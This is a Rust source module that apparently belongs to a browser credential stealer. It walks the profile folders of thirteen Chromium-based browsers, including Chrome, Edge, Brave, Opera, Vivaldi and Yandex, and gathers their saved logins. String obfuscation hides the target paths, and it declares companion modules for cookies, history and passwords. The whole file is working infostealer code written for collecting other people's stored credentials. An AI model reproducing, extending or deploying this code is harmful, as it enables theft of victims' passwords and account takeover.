pub mod cookies;
pub mod history;
pub mod passwords;

use obfstr::obfstr;
use std::{env, path::Path};

use crate::browser::Login;
use passwords::get_creds_chrome;

pub fn get_creds_chromium() -> Option<Vec<Login>> {
    let mut creds: Vec<Login> = Vec::new();
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var(obfstr!("LOCALAPPDATA")).ok()?,
        obfstr!("\\Google\\Chrome\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\BraveSoftware\\Brave-Browser\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Chromium\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Comodo\\Dragon\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Microsoft\\Edge\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Epic Privacy Browser\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Iridium\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("APPDATA").ok()?,
        obfstr!("\\Opera Software\\Opera Stable")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("APPDATA").ok()?,
        obfstr!("\\Opera Software\\Opera GX Stable")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Slimjet\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\UR Browser\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Vivaldi\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!(
        "{}{}",
        env::var("LOCALAPPDATA").ok()?,
        obfstr!("\\Yandex\\YandexBrowser\\User Data")
    ))) {
        creds.append(&mut cred)
    }
    if creds.is_empty() {
        return None;
    }
    Some(creds)
}
